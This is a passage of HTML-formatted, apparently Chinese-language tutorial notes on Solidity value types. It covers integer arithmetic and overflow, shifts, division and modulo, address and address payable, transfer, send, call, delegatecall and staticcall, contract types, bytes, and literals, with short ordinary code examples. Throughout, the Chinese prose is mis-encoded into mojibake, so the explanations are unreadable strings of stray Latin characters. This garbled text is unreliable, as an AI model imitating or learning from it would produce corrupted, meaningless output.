åˆ° <code>uint256</code> ï¼ˆæ— ç¬¦å·ï¼Œä» 8 ä½åˆ° 256 ä½ï¼‰ä»¥åŠ <code>int8</code> åˆ° <code>int256</code>ï¼Œä»¥ <code>8</code> ä½ä¸ºæ­¥é•¿é€’å¢ã€‚ <code>uint</code> å’Œ <code>int</code> åˆ†åˆ«æ˜¯ <code>uint256</code> å’Œ <code>int256</code> çš„åˆ«åã€‚</p><p>è¿ç®—ç¬¦ï¼š</p><ul><li>æ¯”è¾ƒè¿ç®—ç¬¦ï¼š <code>&lt;=</code> ï¼Œ <code>&lt;</code> ï¼Œ <code>==</code> ï¼Œ <code>!=</code> ï¼Œ <code>&gt;=</code> ï¼Œ <code>&gt;</code> ï¼ˆè¿”å›å¸ƒå°”å€¼ï¼‰</li><li>ä½è¿ç®—ç¬¦ï¼š <code>&amp;</code> ï¼Œ <code>|</code> ï¼Œ <code>^</code> ï¼ˆå¼‚æˆ–ï¼‰ï¼Œ <code>~</code> ï¼ˆä½å–åï¼‰</li><li>ç®—æ•°è¿ç®—ç¬¦ï¼š <code>+</code> ï¼Œ <code>-</code> ï¼Œ ä¸€å…ƒè¿ç®— <code>-</code> ï¼ˆä»…é’ˆå¯¹æœ‰ç¬¦å·æ•´æ•°ï¼‰ï¼Œ <code>*</code> ï¼Œ <code>/</code> ï¼Œ <code>%</code> ï¼ˆå–ä½™ï¼‰ ï¼Œ <code>**</code> ï¼ˆå¹‚ï¼‰ï¼Œ <code>&lt;&lt;</code> ï¼ˆå·¦ç§»ä½ï¼‰ ï¼Œ <code>&gt;&gt;</code> ï¼ˆå³ç§»ä½ï¼‰</li></ul><p>å¯¹äºä¸€ä¸ªæ•´æ•°ç±»å‹Xï¼Œä½ å¯ä»¥ä½¿ç”¨type(X).minå’Œtype(X).maxæ¥è®¿é—®è¯¥ç±»å‹å¯è¡¨ç¤ºçš„æœ€å°å’Œæœ€å¤§å€¼ã€‚</p><h3 id="ä½æ“ä½œ"><a href="#ä½æ“ä½œ" class="headerlink" title="ä½æ“ä½œ"></a>ä½æ“ä½œ</h3><p>ä½æ“ä½œæ˜¯åœ¨æ•°å­—çš„è¡¥ç è¿›è¡Œçš„ã€‚è¿™æ„å‘³ç€ï¼Œä¾‹å¦‚<code>~int256(0) == int256(-1)</code></p><h3 id="ç§»ä½"><a href="#ç§»ä½" class="headerlink" title="ç§»ä½"></a>ç§»ä½</h3><p>ç§»ä½æ“ä½œçš„ç»“æœå°†æˆªæ–­æˆå·¦æ“ä½œæ•°çš„ç±»å‹ï¼›å³æ“ä½œæ•°å¿…é¡»æ˜¯æ— ç¬¦å·ç±»å‹ï¼Œå¦åˆ™ä¼šäº§ç”Ÿç¼–è¯‘é”™è¯¯ã€‚</p><ul><li><code>x &lt;&lt; y</code> ç­‰ä»·äº<code>x * 2**y</code>.</li><li><p><code>x &gt;&gt; y</code>ç­‰ä»·äº<code>x / 2**y</code>ï¼Œå‘è´Ÿæ— ç©·å–æ•´</p></li><li><p>åœ¨<code>0.5.0</code>ç‰ˆæœ¬ä¹‹å‰ï¼Œè´Ÿæ•°xçš„å³ç§»<code>x&gt;&gt;y</code>ç›¸å½“äºæ•°å­¦è¡¨è¾¾å¼<code>x/2**y</code>å‘é›¶èˆå…¥ï¼Œå³å³ç§»ä½¿ç”¨å‘ä¸Šå–æ•´ï¼ˆå‘é›¶ï¼‰è€Œä¸æ˜¯å‘ä¸‹å–æ•´ï¼ˆå‘è´Ÿæ— ç©·ï¼‰ã€‚</p></li></ul><p>psï¼šå¯¹ç§»ä½æ“ä½œä»ä¸è¿›è¡Œæº¢å‡ºæ£€æŸ¥ï¼Œå°±åƒå¯¹ç®—æœ¯æ“ä½œé‚£æ ·ã€‚ç›¸åï¼Œç»“æœæ€»æ˜¯è¢«æˆªæ–­çš„ã€‚</p><h3 id="åŠ å‡ä¹˜"><a href="#åŠ å‡ä¹˜" class="headerlink" title="åŠ å‡ä¹˜"></a>åŠ å‡ä¹˜</h3><p>åŠ æ³•ã€å‡æ³•å’Œä¹˜æ³•å…·æœ‰é€šå¸¸çš„è¯­ä¹‰ï¼Œåœ¨æº¢å‡ºå’Œä¸‹æº¢æ–¹é¢æœ‰ä¸¤ç§ä¸åŒçš„æ¨¡å¼ï¼š</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„ç®—æœ¯éƒ½ä¼šè¢«æ£€æŸ¥æ˜¯å¦æœ‰ä¸‹æº¢ï¼Œä½†è¿™å¯ä»¥é€šè¿‡uncheckedå—æ¥ç¦ç”¨ï¼Œä»è€Œå¯¼è‡´åŒ…è£…ç®—æœ¯ã€‚æ›´å¤šçš„ç»†èŠ‚å¯ä»¥åœ¨è¯¥éƒ¨åˆ†æ‰¾åˆ°ã€‚</p><p>è¡¨è¾¾å¼-xç›¸å½“äºï¼ˆT(0) - xï¼‰ï¼Œå…¶ä¸­Tæ˜¯xçš„ç±»å‹ã€‚å¦‚æœxæ˜¯è´Ÿçš„ï¼Œ-xçš„å€¼å¯ä»¥æ˜¯æ­£çš„ã€‚è¿˜æœ‰ä¸€ä¸ªæ³¨æ„äº‹é¡¹ä¹Ÿæ˜¯ç”±è¡¥ç å¼•èµ·çš„ï¼š</p><p><code>å¦‚æœä½ æœ‰int x = type(int).min;ï¼Œé‚£ä¹ˆ-xå°±ä¸ç¬¦åˆæ­£çš„èŒƒå›´ã€‚è¿™æ„å‘³ç€æœªç»æ£€æŸ¥çš„&#123; assert(-x == x); &#125;æ˜¯æœ‰æ•ˆçš„ï¼Œè€Œè¡¨è¾¾å¼-xåœ¨æ£€æŸ¥æ¨¡å¼ä¸‹ä½¿ç”¨æ—¶å°†å¯¼è‡´ä¸€ä¸ªå¤±è´¥çš„æ–­è¨€ã€‚</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.1;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    int256 public a;</span><br><span class="line">    int256 public b;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        a = type(int256).min;</span><br><span class="line">        unchecked&#123;</span><br><span class="line">            b = -a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function compare() public view returns(bool) &#123;</span><br><span class="line">        bool jdg = (a==b);</span><br><span class="line">        return jdg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20230517153400833.png" alt="image-20230517153400833"></p><h3 id="é™¤"><a href="#é™¤" class="headerlink" title="é™¤"></a>é™¤</h3><p>ç”±äºè¿ç®—ç»“æœçš„ç±»å‹æ€»æ˜¯æ“ä½œæ•°ä¹‹ä¸€çš„ç±»å‹ï¼Œæ•´æ•°é™¤æ³•çš„ç»“æœæ€»æ˜¯ä¸€ä¸ªæ•´æ•°ã€‚åœ¨Solidityä¸­ï¼Œé™¤æ³•æ˜¯å‘é›¶è¿›ä½çš„ã€‚è¿™æ„å‘³ç€<code>int256(-5) / int256(2) == int256(-2)</code>ã€‚</p><p>è¯·æ³¨æ„ï¼Œä¸æ­¤ç›¸åï¼Œåœ¨å­—é¢é‡ï¼ˆliteralsï¼‰ä¸Šé™¤æ³•çš„ç»“æœæ˜¯ä»»æ„ç²¾åº¦çš„å°æ•°å€¼ã€‚</p><p>é™¤ä»¥0ä¸ºå¯¼è‡´æŠ¥é”™ï¼Œå¹¶ä¸”ä¸èƒ½ä½¿ç”¨<code>unchecked&#123;&#125;</code>æ¥ç¦ç”¨ã€‚</p><p><code>type(int).min / (-1)</code>è¿™ä¸ªè¡¨è¾¾å¼æ˜¯é™¤æ³•å¯¼è‡´ä¸Šæº¢çš„å”¯ä¸€æƒ…å†µ</p><h3 id="æ¨¡"><a href="#æ¨¡" class="headerlink" title="æ¨¡"></a>æ¨¡</h3><p>æ¨¡æ“ä½œ<code>a % n</code>äº§ç”Ÿæ“ä½œæ•°<code>a</code>é™¤ä»¥æ“ä½œæ•°<code>n</code>åçš„ä½™æ•°<code>r</code>ï¼Œå…¶ä¸­<code>q = int(a / n)ï¼Œr = a - (n * q)</code>ã€‚è¿™æ„å‘³ç€æ¨¡è¿ç®—çš„ç»“æœä¸å®ƒçš„å·¦è¾¹æ“ä½œæ•°ï¼ˆæˆ–é›¶ï¼‰ç›¸åŒï¼Œ<code>a % n == -(-a % n)</code>å¯¹è´Ÿæ•°<code>a</code>æˆç«‹ï¼š</p><ul><li><code>int256(5) % int256(2) == int256(1)</code></li><li><code>int256(5) % int256(-2) == int256(1)</code></li><li><code>int256(-5) % int256(2) == int256(-1)</code></li><li><code>int256(-5) % int256(-2) == int256(-1)</code></li></ul><p>æ¨¡0ä¼šå¯¼è‡´æŠ¥é”™ï¼Œå¹¶ä¸”ä¸èƒ½ä½¿ç”¨<code>unchecked&#123;&#125;</code>æ¥ç¦ç”¨ã€‚</p><h3 id="å¹‚"><a href="#å¹‚" class="headerlink" title="å¹‚"></a>å¹‚</h3><p>å»ºè®®ç”¨<code>x*x*x</code>æ¥ä»£æ›¿<code>x**3</code>æ¥å‡å°‘gasæ¶ˆè€—</p><p>EVMå®šä¹‰<code>0**0=1</code></p><h3 id="åœ°å€"><a href="#åœ°å€" class="headerlink" title="åœ°å€"></a>åœ°å€</h3><p>åœ°å€æœ‰ä¸¤ç§ï¼š</p><ul><li><code>address</code>: ä¿å­˜ä¸€ä¸ª20å­—èŠ‚çš„å€¼ï¼ˆä»¥å¤ªåŠåœ°å€çš„å¤§å°ï¼‰ã€‚</li><li><p><code>address payable</code>: ä¸<code>address</code>ç›¸åŒï¼Œä½†æœ‰é¢å¤–çš„æ–¹æ³•<code>transfer</code>å’Œ<code>send</code>ã€‚</p><p><code>payable address</code>åˆ°<code>address</code>æ˜¯å¯ä»¥éšå¼è½¬æ¢çš„ï¼Œä½†<code>address</code>åˆ°<code>payable address</code>å¿…é¡»é€šè¿‡æ˜¾å¼è½¬æ¢ï¼š<code>payable(&lt;address&gt;)</code></p><p><code>uint160</code>ï¼Œæ•´æ•°å­—é¢é‡ã€<code>bytes20</code>å’Œåˆçº¦ç±»å‹éƒ½å¯ä»¥å’Œ<code>address</code>è¿›è¡Œæ˜¾å¼è½¬æ¢</p><p>åªæœ‰<code>address</code>å’Œåˆçº¦ç±»å‹å¯ä»¥é€šè¿‡<code>payable</code>è½¬æ¢æˆ<code>address payable</code>ã€‚å¯¹äºä¸€ä¸ªåˆçº¦ç±»å‹ï¼Œåªæœ‰å®ƒå¯ä»¥æ¥æ”¶ä»¥å¤ªå¸æˆ–å­˜åœ¨ä¸€ä¸ª<code>payable fallback function</code>æ‰å¯ä»¥å®Œæˆè½¬æ¢ã€‚æ³¨æ„ <code>payable(0)</code>æ˜¯è®¸å¯çš„ã€‚</p></li></ul><p>æ³¨æ„ï¼š</p><ol><li>å¦‚æœä½ éœ€è¦ä¸€ä¸ª<code>address</code>ç±»å‹çš„å˜é‡ï¼Œå¹¶è®¡åˆ’å‘å…¶å‘é€ä»¥å¤ªå¸ï¼Œé‚£ä¹ˆè¯·å°†å…¶ç±»å‹å£°æ˜ä¸º<code>payable address</code></li><li><code>address</code>å’Œ<code>address payable</code>çš„åŒºåˆ«åœ¨<strong>0.5.0</strong>ç‰ˆæœ¬ä¸­å¼•å…¥çš„ã€‚åŒæ ·ä»è¯¥ç‰ˆæœ¬å¼€å§‹ï¼Œåˆçº¦ä¸èƒ½éšå«åœ°è½¬æ¢ä¸º<code>address</code>ç±»å‹ã€‚ä½†å¦‚æœå®ƒä»¬æœ‰ä¸€ä¸ªæ¥æ”¶æˆ–<code>payable fallback function</code>ï¼Œä»ç„¶å¯ä»¥æ˜¾å¼åœ°è½¬æ¢ä¸º<code>address</code>æˆ–<code>address payable</code>ã€‚</li></ol><p>å¦‚æœæŠŠä¸€ä¸ªè¾ƒå¤§çš„bytesè½¬æ¢æˆä¸€ä¸ª<code>address</code>ï¼Œä¾‹å¦‚<code>bytes32</code>ï¼Œé‚£ä¹ˆ<code>address</code>å°†è¢«æˆªæ–­ã€‚ä¾‹å¦‚ï¼Œ<code>b = &#39;0x111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFCCCC&#39;</code>:</p><ul><li><code>address(uint160(bytes20(b))) = 0x111122223333444455556666777788889999aAaa</code></li><li><code>address(uint160(uint256(b))) = 0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc</code></li></ul><h3 id="åœ°å€æˆå‘˜"><a href="#åœ°å€æˆå‘˜" class="headerlink" title="åœ°å€æˆå‘˜"></a>åœ°å€æˆå‘˜</h3><ul><li><p><code>balance</code> å’Œ <code>transfer</code></p><p>æŸ¥è¯¢æŸä¸ªåœ°å€çš„ä½™é¢ä½¿ç”¨balanceï¼Œå‘æŸä¸ªpayable addresså‘é€ä»¥å¤ªå¸ï¼ˆweiä¸ºå•ä½ï¼‰ä½¿ç”¨transferï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address payable x = payable(0x123);</span><br><span class="line">address myAddress = address(this);</span><br><span class="line">if (x.balance &lt; 10 &amp;&amp; myAddress.balance &gt;= 10) x.transfer(10);</span><br></pre></td></tr></table></figure><p>å¦‚æœxæ˜¯ä¸€ä¸ªåˆçº¦åœ°å€ï¼Œå®ƒçš„ä»£ç ï¼ˆå®é™…ä¸Šæ˜¯æ¥å—ä»¥å¤ªåŠçš„å‡½æ•°ï¼Œæˆ–<code>Fallback</code>å‡½æ•°ï¼‰ä¼šè¿åŒ<code>transfer</code>ä¸€èµ·æ‰§è¡Œã€‚è¿™æ˜¯EVMçš„ä¸€ä¸ªç‰¹æ€§ï¼Œæ— æ³•è¢«é˜»æ­¢ã€‚å¦‚æœè¿™æ®µæ‰§è¡Œå°†gasæ¶ˆè€—å®Œæˆ–å…¶ä»–åŸå› å¤±è´¥ï¼Œ<code>transfer</code>å°±ä¼šè¢«å›é€€</p></li><li><p><code>send</code></p><p><code>send</code>æ˜¯ä½çº§åˆ«çš„<code>transfer</code>ï¼Œå¦‚æœæ‰§è¡Œå¤±è´¥åˆ™ä¼šè¿”å›<code>false</code>è€Œä¸æ˜¯å›é€€</p><p>ä½¿ç”¨<code>send</code>æœ‰ä¸€äº›å±é™©ï¼š å¦‚æœè°ƒç”¨å †æ ˆæ·±åº¦ä¸º1024ï¼Œè½¬è´¦å°±ä¼šå¤±è´¥ï¼ˆè¿™å¯ä»¥ç”±è°ƒç”¨è€…å¼ºåˆ¶æ‰§è¡Œï¼‰ï¼Œå¦‚æœæ¥æ”¶è€…æ²¡æœ‰<code>gas</code>äº†ï¼Œä¹Ÿä¼šå¤±è´¥ã€‚å› æ­¤ï¼Œä¸ºäº†å®‰å…¨åœ°è¿›è¡Œä»¥å¤ªå¸è½¬è´¦ï¼Œä¸€å®šè¦æ£€æŸ¥<code>send</code>çš„è¿”å›å€¼ã€ä½¿ç”¨<code>transfer</code>ï¼Œç”šè‡³æ›´å¥½çš„æ˜¯ï¼šä½¿ç”¨æ”¶æ¬¾äººå–æ¬¾çš„æ¨¡å¼</p></li><li><p><code>call</code>, <code>delegatecall</code> å’Œ <code>staticcall</code></p><p>ä¸ºäº†ä¸ä¸éµå®ˆABIçš„åˆçº¦äº¤äº’ï¼Œæˆ–è€…ä¸ºäº†æ›´ç›´æ¥åœ°æ§åˆ¶ç¼–ç ï¼Œæˆ‘ä»¬æä¾›äº†å‡½æ•°<code>call</code>ã€<code>delegatecall</code>å’Œ<code>staticcall</code>ã€‚å®ƒä»¬éƒ½æ¥å—ä¸€ä¸ªå­—èŠ‚çš„å†…å­˜å‚æ•°ï¼Œå¹¶è¿”å›æˆåŠŸæ¡ä»¶ï¼ˆä½œä¸ºä¸€ä¸ª<code>bool</code>ï¼‰å’Œè¿”å›çš„æ•°æ®ï¼ˆå­—èŠ‚å†…å­˜ï¼‰ã€‚å‡½æ•°<code>abi.encode</code>, <code>abi.encodePacked</code>, <code>abi.encodeWithSelector</code>å’Œ<code>abi.encodeWithSignature</code>å¯ç”¨äºç¼–ç ç»“æ„åŒ–æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes memory payload = abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;);</span><br><span class="line">(bool success, bytes memory returnData) = address(nameReg).call(payload);</span><br><span class="line">require(success);</span><br></pre></td></tr></table></figure><ul><li><p>å¯ä»¥è°ƒèŠ‚gasæ¶ˆè€—é‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call&#123;gas: 1000000&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure></li><li><p>ä»¥å¤ªå¸ä¹Ÿå¯ä»¥è°ƒèŠ‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call&#123;value: 1 ether&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure></li><li><p>ç”šè‡³æ˜¯ç»„åˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call&#123;gas: 1000000, value: 1 ether&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure></li></ul><p>åŒæ ·çš„ï¼Œ<code>delegatecall</code>ä¹Ÿå¯ä»¥è¢«è¿™æ ·ä½¿ç”¨ï¼Œä½†ä¸åŒçš„ç‚¹åœ¨äºï¼šæ‰§è¡Œç¯å¢ƒä¸ºå½“å‰åˆçº¦çš„ç¯å¢ƒï¼Œç›®æ ‡åˆçº¦åœ°å€åªæ˜¯è¢«è°ƒç”¨ï¼Œ<code>delegatecall</code>çš„ç›®çš„æ˜¯ä¸ºäº†ä½¿ç”¨åœ¨å¦ä¸€ä¸ªåˆçº¦ä¸­çš„åº“ä»£ç </p><p><code>staticcall</code>ä¸<code>call</code>ç›¸ä¼¼ï¼Œä½†å®ƒä¼šåœ¨è°ƒç”¨çš„å‡½æ•°æ”¹å˜çŠ¶æ€å<code>revert</code></p><p>æ‰€æœ‰è¿™ä¸‰ä¸ªå‡½æ•°<code>call</code>, <code>delegatecall</code> å’Œ <code>staticcall</code>éƒ½æ˜¯éå¸¸ä½çº§çš„å‡½æ•°ï¼Œåªåº”è¯¥ä½œä¸ºæœ€åçš„æ‰‹æ®µä½¿ç”¨ï¼Œå› ä¸ºå®ƒä»¬ç ´åäº†Solidityçš„ç±»å‹å®‰å…¨ã€‚</p><p><code>gas</code>é€‰é¡¹åœ¨æ‰€æœ‰ä¸‰ç§æ–¹æ³•ä¸­éƒ½å…è´¹ï¼Œè€Œ<code>value</code>é€‰é¡¹åªåœ¨<code>call</code>ä¸­å…è´¹ã€‚</p></li><li><p><code>code</code> å’Œ<code>codehash</code></p><p>å¯ä»¥æŸ¥è¯¢ä»»ä½•æ™ºèƒ½åˆçº¦çš„éƒ¨ç½²ä»£ç ã€‚ä½¿ç”¨<code>.code</code>æ¥è·å–<code>EVM</code>å­—èŠ‚ç ï¼Œä½œä¸ºå­—èŠ‚å†…å­˜ï¼Œå®ƒå¯èƒ½æ˜¯ç©ºçš„ã€‚ä½¿ç”¨<code>.codehash</code>è·å¾—è¯¥ä»£ç çš„<code>Keccak-256</code>å“ˆå¸Œå€¼ï¼ˆä½œä¸º<code>bytes32</code>ï¼‰ã€‚æ³¨æ„ï¼Œ<code>addr.codehash</code>æ¯”ä½¿ç”¨<code>keccak256(addr.code)</code>æ›´ä¾¿å®œã€‚</p><p>æ‰€æœ‰çš„åˆåŒéƒ½å¯ä»¥è½¬æ¢ä¸º<code>address</code>ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>address(this).balance</code>æŸ¥è¯¢å½“å‰åˆåŒçš„ä½™é¢ã€‚</p></li></ul><h3 id="åˆçº¦ç±»å‹"><a href="#åˆçº¦ç±»å‹" class="headerlink" title="åˆçº¦ç±»å‹"></a>åˆçº¦ç±»å‹</h3><p>æ¯ä¸ªåˆçº¦éƒ½æœ‰è‡ªå·±çš„ç±»å‹ï¼Œå®ƒå¯ä»¥é€šè¿‡<code>adress(x)</code>æ˜¾å¼åœ°è½¬åŒ–æˆ<code>address</code>ç±»å‹ï¼›å¦‚æœåˆçº¦ä¸­å­˜åœ¨<code>receive</code>æˆ–<code>payable fallback</code>å‡½æ•°ï¼Œåˆ™èƒ½è½¬æ¢æˆ<code>payable address</code>ç±»å‹ï¼›å¦åˆ™éœ€è¦ç”¨<code>payable(address(x))</code>æ¥è½¬æ¢ã€‚</p><p>æ³¨æ„ï¼šåœ¨<code>0.5.0</code>ç‰ˆæœ¬ä»¥å‰ï¼Œ<code>address</code>å’Œ<code>payable address</code>æ²¡æœ‰åŒºåˆ«ã€‚</p><p>åˆçº¦çš„æ•°æ®è¡¨ç¤ºä¸åœ°å€ç±»å‹ç›¸åŒï¼Œè¿™ç§ç±»å‹ä¹Ÿåœ¨<code>ABI</code>ä¸­ä½¿ç”¨ã€‚</p><p>åˆçº¦ä¸æ”¯æŒä»»ä½•æ“ä½œç¬¦ã€‚</p><p>åˆçº¦çš„æˆå‘˜åŒ…æ‹¬åˆçº¦çš„<code>public</code>å‡½æ•°å’Œä»»ä½•æ ‡è®°<code>public</code>çš„çŠ¶æ€å˜é‡ã€‚</p><p>å¯¹äºä¸€ä¸ªåˆçº¦<code>c</code>ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>type(c)</code>æ¥è®¿é—®åˆåŒçš„ç±»å‹ä¿¡æ¯ã€‚</p><h3 id="å®šé•¿å­—èŠ‚æ•°ç»„"><a href="#å®šé•¿å­—èŠ‚æ•°ç»„" class="headerlink" title="å®šé•¿å­—èŠ‚æ•°ç»„"></a>å®šé•¿å­—èŠ‚æ•°ç»„</h3><p><code>bytes1, bytes2, bytes3, ..., bytes32</code>ä¿å­˜ä¸€ä¸²ä»1åˆ°32çš„å­—èŠ‚ã€‚</p><p>æ“ä½œç¬¦ï¼š</p><ul><li>æ¯”è¾ƒï¼š <code>&lt;=</code>, <code>&lt;</code>, <code>==</code>, <code>!=</code>, <code>&gt;=</code>, <code>&gt;</code> (è¯„ä¼°ä¸ºbool)</li><li>æ¯”ç‰¹è¿ç®—ç¬¦ï¼š<code>&amp;</code>, <code>|</code>, <code>^</code> (bitå¼‚æˆ–), <code>~</code> (æ¯”ç‰¹å–å)</li><li>ç§»ä½è¿ç®—ç¬¦ï¼š <code>&lt;&lt;</code>ï¼ˆå·¦ç§»ï¼‰ï¼Œ<code>&gt;&gt;</code>ï¼ˆå³ç§»ï¼‰</li><li>ç´¢å¼•è®¿é—®ï¼š å¦‚æœ<code>x</code>æ˜¯<code>bytesI</code>ç±»å‹çš„ï¼Œé‚£ä¹ˆ<code>x[k]</code>å¯¹äº<code>0 &lt;= k &lt; I</code>è¿”å›ç¬¬<code>k</code>ä¸ªå­—èŠ‚ï¼ˆåªè¯»ï¼‰ã€‚</li></ul><p>æˆå‘˜ï¼š</p><ul><li><code>.length</code> è¿”å›å®šé•¿æ•°ç»„çš„é•¿åº¦ï¼ˆåªè¯»ï¼‰</li></ul><p>æ³¨æ„ï¼š<code>bytes1[]</code>ç±»å‹æ˜¯ä¸€ä¸ªå­—èŠ‚æ•°ç»„ï¼Œä½†æ˜¯ç”±äºå¡«å……è§„åˆ™ï¼Œå®ƒä¸ºæ¯ä¸ªå…ƒç´ æµªè´¹äº†31ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼ˆé™¤äº†åœ¨å­˜å‚¨ä¸­ï¼‰ã€‚æœ€å¥½ä½¿ç”¨<code>bytes</code>ç±»å‹æ¥ä»£æ›¿ã€‚</p><p>æ³¨æ„ï¼šåœ¨<code>0.8.0</code>ç‰ˆæœ¬ä¹‹å‰ï¼Œ<code>byte</code>æ›¾ç»æ˜¯<code>bytes1</code>çš„åˆ«åã€‚</p><h3 id="å˜é•¿å­—èŠ‚æ•°ç»„"><a href="#å˜é•¿å­—èŠ‚æ•°ç»„" class="headerlink" title="å˜é•¿å­—èŠ‚æ•°ç»„"></a>å˜é•¿å­—èŠ‚æ•°ç»„</h3><p><code>bytes</code>å’Œ<code>string</code></p><h3 id="åœ°å€å­—é¢é‡"><a href="#åœ°å€å­—é¢é‡" class="headerlink" title="åœ°å€å­—é¢é‡"></a>åœ°å€å­—é¢é‡</h3><p>ä»¥<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-55.md">EIP-55</a>.ä¸ºæ ‡å‡†ï¼Œä¸é€šè¿‡æ ¡éªŒå°†æ— æ³•æˆä¸ºåœ°å€</p><h3 id="æœ‰ç†æ•°å’Œæ•´æ•°å­—é¢é‡"><a href="#æœ‰ç†æ•°å’Œæ•´æ•°å­—é¢é‡" class="headerlink" title="æœ‰ç†æ•°å’Œæ•´æ•°å­—é¢é‡"></a>æœ‰ç†æ•°å’Œæ•´æ•°å­—é¢é‡</h3><p>å°æ•°ç‚¹å­—é¢é‡æ˜¯ç”±<code>.</code>ä¸å°æ•°ç‚¹åçš„è‡³å°‘ä¸€ä¸ªæ•°å­—ç»„æˆã€‚ä¾‹å­åŒ…æ‹¬<code>.1</code>å’Œ<code>1.3</code>ï¼ˆä½†ä¸èƒ½æ˜¯<code>1.</code>ï¼‰ã€‚ä¹Ÿæ”¯æŒç§‘å­¦è®¡æ•°æ³•ï¼Œå­—é¢é‡MeEç­‰ä»·äº<code>M*10**E</code>ï¼ŒæŒ‡æ•°éƒ¨åˆ†å¿…é¡»æ˜¯æ•´æ•°ï¼Œå°¾æ•°å¯ä»¥æ˜¯å°æ•°ã€‚</p><p>ä¸‹åˆ’çº¿å¯ç”¨æ¥æé«˜ä»£ç å¯è¯»æ€§ï¼Œæ²¡æœ‰å…¶ä»–ä»»ä½•æ„ä¹‰ã€‚ä¾‹å¦‚ï¼Œåè¿›åˆ¶123_000ï¼Œåå…­è¿›åˆ¶0x2eff_abdeï¼Œç§‘å­¦åè¿›åˆ¶ç¬¦å·1_2e345_678éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚ä¸‹åˆ’çº¿åªå…è®¸åœ¨ä¸¤ä¸ªæ•°å­—ä¹‹é—´ï¼Œå¹¶ä¸”åªå…è®¸ä¸€ä¸ªè¿ç»­çš„ä¸‹åˆ’çº¿ã€‚</p><p>æ•°å­—å­—é¢è¡¨è¾¾å¼ä¿ç•™äº†ä»»æ„ç²¾åº¦ï¼Œç›´åˆ°è¢«è½¬æ¢æˆå…¶ä»–éå­—é¢ç±»å‹ï¼ˆå³é€šè¿‡ä¸æ•°å­—å­—é¢è¡¨è¾¾å¼ä»¥å¤–çš„å…¶ä»–ä¸œè¥¿ä¸€èµ·ä½¿ç”¨ï¼ˆå¦‚å¸ƒå°”å­—é¢ï¼‰æˆ–æ˜¾å¼è½¬æ¢ï¼‰ã€‚åœ¨æ•°å­—å­—é¢è¡¨è¾¾å¼ä¸­ï¼Œè®¡ç®—ä¸ä¼šæº¢å‡ºï¼Œé™¤æ³•ä¸ä¼šæˆªæ–­ã€‚ä¾‹å¦‚ï¼Œ<code>2**800+1-2**800</code>åœ¨å­—é¢é‡ä¸­æ˜¯å…è®¸çš„ã€‚<code>.5*8</code>çš„ç»“æœæ˜¯æ•´å‹çš„<code>4</code>ã€‚</p><p>åªè¦æ“ä½œæ•°æ˜¯æ•´æ•°ï¼Œä»»ä½•å¯ä»¥åº”ç”¨äºæ•´æ•°çš„æ“ä½œç¬¦ä¹Ÿå¯ä»¥åº”ç”¨äºæ•°å­—å­—é¢è¡¨è¾¾å¼ã€‚å¦‚æœä¸¤è€…ä¸­çš„ä»»ä½•ä¸€ä¸ªæ˜¯å°æ•°ï¼Œåˆ™ä¸å…è®¸è¿›è¡Œä½æ“ä½œï¼Œå¦‚æœæŒ‡æ•°æ˜¯å°æ•°ï¼Œåˆ™ä¸å…è®¸è¿›è¡ŒæŒ‡æ•°åŒ–ï¼ˆå› 